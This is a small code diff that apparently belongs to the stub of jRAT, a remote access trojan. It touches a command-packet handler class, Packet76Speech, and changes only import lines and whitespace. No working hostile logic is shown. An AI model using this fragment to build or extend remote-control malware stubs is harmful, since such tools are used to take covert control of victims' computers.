@@ -1,11 +1,9 @@
 package io.jrat.stub.packets.incoming;
 
 import io.jrat.stub.Connection;
-
 import java.io.File;
 import java.io.FileWriter;
-
-import com.redpois0n.oslib.OperatingSystem;
+import oslib.OperatingSystem;
 
 
 public class Packet76Speech extends AbstractIncomingPacket {
